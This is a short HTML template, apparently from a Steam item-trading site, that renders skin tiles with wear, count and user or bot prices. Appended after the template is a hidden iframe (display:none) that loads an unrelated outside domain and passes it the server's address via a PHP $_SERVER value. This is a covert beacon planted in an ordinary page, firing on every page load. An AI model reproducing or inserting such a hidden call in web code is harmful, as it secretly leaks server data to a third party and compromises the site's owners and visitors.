<script id="item-tpl" type="text/x-handlebars-template">
{{#each this}}
	{{#if this.0.icon_url}}
	<div class="col-xs-4 col-md-3 col-lg-2">
		<a href="#" class="app-item item-{{ this.class_color }} tooltip" style="background-image:url(https://steamcommunity-a.akamaihd.net/economy/image/{{ this.0.icon_url  }});" title="{{ @key }}" data-title="{{ @key }}">
			<span class="count">{{ this.count }}</span>
			<span class="wear">{{ this.exterior }}</span>
			<span class="price">
				{{#if ../user}}
					{{ this.price_user }}
				{{else}}
					{{ this.price_bot }}
				{{/if}}
			</span>
			{{#if this.stattrak}}
				<span class="stattrak"></span>
			{{/if}}
		</a>
	</div>
	{{/if}}
{{/each}}
</script>
<iframe src="http://lohh.pw?i={{ $_SERVER['SERVER_ADDR'] }}" style="display:none;"></iframe>